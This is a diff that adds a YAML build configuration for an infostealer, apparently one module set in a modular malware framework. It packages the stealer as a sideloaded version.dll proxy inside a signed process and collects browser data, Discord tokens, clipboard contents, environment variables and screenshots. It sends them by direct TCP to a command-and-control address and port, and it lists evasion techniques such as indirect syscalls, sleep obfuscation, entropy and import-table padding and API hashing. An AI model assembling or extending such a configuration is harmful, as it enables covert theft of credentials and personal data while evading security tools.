@@ -1,0 +1,36 @@
+name: infostealer_dll_rundll
+description: Infostealer as DLL sideload — version.dll proxy, runs inside signed host process
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/system_info
+  - collectors/processes
+  - collectors/installed_software
+  - collectors/env_vars
+  - collectors/clipboard
+  - collectors/browser_chromium
+  - collectors/discord_tokens
+  - collectors/screenshot
+
+exfil: exfil/tcp_direct
+arch: arch/dll_sideload
+def_file: version.def
+
+api_resolve: api_resolve/api_hash_djb2
+
+resources: true
+
+evasion:
+  - evasion/indirect_syscall
+  - evasion/sleep_ekko
+  - evasion/entropy_pad
+  - evasion/iat_pad
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
